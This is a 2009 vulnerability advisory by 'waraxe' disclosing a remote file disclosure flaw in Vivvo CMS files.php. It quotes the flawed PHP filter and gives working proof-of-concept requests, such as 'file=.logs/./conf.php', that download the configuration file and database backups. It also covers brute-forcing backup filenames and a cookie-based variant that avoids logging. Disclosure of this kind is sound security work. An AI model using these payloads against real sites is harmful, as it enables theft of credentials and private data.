@@ -1,0 +1,115 @@
+[waraxe-2009-SA#075] - Remote File Disclosure in Vivvo CMS 4.1.5.1
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 21. October 2009
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-75.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vivvo CMS is an intuitive content management system atop a powerful programming
+framework, empowering numerous industry leading online newspapers, magazines,
+journals, TV and radio stations.
+
+http://www.vivvo.net/ 
+
+
+List of found vulnerabilities
+===============================================================================
+
+1. Remote File Disclosure in "files.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Reasons:
+  1. wrongly implemented filtering of user submitted data
+
+Preconditions: none
+
+Impact: remote attacker can download arbitrary files from target server
+
+Remarks:
+1. authentication is not needed
+2. POST parameters or cookies can be used as attack vector
+3. Vulnerable are all Vivvo CMS versions >= 4.1.0
+
+-----------------------------[source code start]-------------------------------
+if (isset($_REQUEST["file"])) {
+	$filename = str_replace('..', '', $_REQUEST["file"]);
+	$filename = str_replace('logs/', '', $filename);
+	$file = VIVVO_FS_ROOT . 'files/' . $filename;
+	if (file_exists($file) && !is_link($file) && !is_dir($file)){
+		$file_split =  explode('.', $file);
+		$ext = end ($file_split);	    
+...
+		header("Content-type: application/force-download");
+		header("Content-disposition: attachment; filename=\"".basename($file)."\"");		
+	}
+	readfile($file);
+-----------------------------[source code end]---------------------------------
+
+Source code snippet above takes user submitted parameter "file" and will use it
+in file path. There is security measure against obvious directory traversal
+risk - double dots ("..") are filtered out from user submitted data.
+
+Let's try this:
+
+http://localhost/vivvo.4.1.5.1/files.php?file=../conf.php
+
+... and we get 404 error:
+
+Page Not Found
+The requested URL was not found on this server.
+If you believe this page should be here, please notify administrator.
+
+OK, directory traversal is not possible here. But ... wait a minute ...
+What happens, if we try something like this:
+
+http://localhost/vivvo.4.1.5.1/files.php?file=.logs/./conf.php
+
+Oops, we can download Vivvo CMS configuration file with sensitive data inside.
+How about database backup?
+
+http://localhost/vivvo.4.1.5.1/files.php?file=.logs/./backup/21-10-2009-18-46_vivvo4151.sql.gz
+
+... and we have admin's password hash (simple MD5) in our possession.
+Database backup's filename must be guessed before successful download, but it is
+not complex task. We allready know database name (from conf.php), there is
+only 1440 minutes in one day, so attacker can use bruteforce for filename guessing.
+For example, if backup is done within last 30 days, then maximum 43200 requests
+is needed for successful database backup fetching. 
+
+As vulnerable input variable is $_REQUEST["file"], then attack vector can be
+not only GET parameter, but also POST parameter or even cookie. As most real 
+world webservers do not log POST data and cookies, then such method can make
+attack less "noisy". Proof of concept:
+
+1. open Vivvo webpage:
+
+http://localhost/vivvo.4.1.5.1/
+
+2. use javascript for cookie manipulation:
+
+javascript:document.cookie="file=.logs/./conf.php";
+
+3. open same webpage again and download of "conf.php" is possible.
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, zerobytes, str0ke,
+to all active waraxe.us forum members and to anyone else who know me!
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+---------------------------------- [ EOF ] ------------------------------------
